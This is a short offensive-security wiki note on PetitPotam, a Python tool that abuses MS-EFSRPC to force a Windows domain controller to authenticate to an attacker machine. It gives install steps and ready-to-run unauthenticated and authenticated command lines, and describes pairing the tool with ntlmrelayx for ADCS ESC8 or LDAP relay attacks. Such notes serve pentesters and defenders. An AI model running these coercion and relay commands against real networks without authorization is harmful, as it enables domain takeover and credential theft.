# PetitPotam

**Tags:** `#petitpotam` `#ntlmcoercion` `#efsrpc` `#relay` `#activedirectory` `#lateralmovement`

Python script (topotam) that coerces a Windows host — typically a Domain Controller — into authenticating to an attacker-controlled machine, by abusing MS-EFSRPC. On unpatched targets it works **fully unauthenticated**; Microsoft's patches added an auth requirement but didn't kill the technique outright. Classic pairing: coerce with PetitPotam, catch/relay the resulting NTLM auth with [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]] against the ADCS Web Enrollment endpoint (ESC8) or LDAP (RBCD). [[Tools/Lateral Movement/Coercer|Coercer]] is the maintained, multi-protocol successor if PetitPotam's specific method stops working on a target.

**Source:** https://github.com/topotam/PetitPotam
**Install:** `git clone https://github.com/topotam/PetitPotam` — pure Python, only needs `impacket`.

```bash
# Unauthenticated coercion (unpatched targets)
python3 PetitPotam.py -u '' -p '' <attacker_ip> <dc_ip>

# Authenticated coercion (patched targets still requiring auth, not fixed method)
python3 PetitPotam.py -u <user> -p '<pass>' <attacker_ip> <dc_ip>
```

> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] ESC8 and ESC11 attack vectors, which use this to trigger the coerced NTLM auth that gets relayed.

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
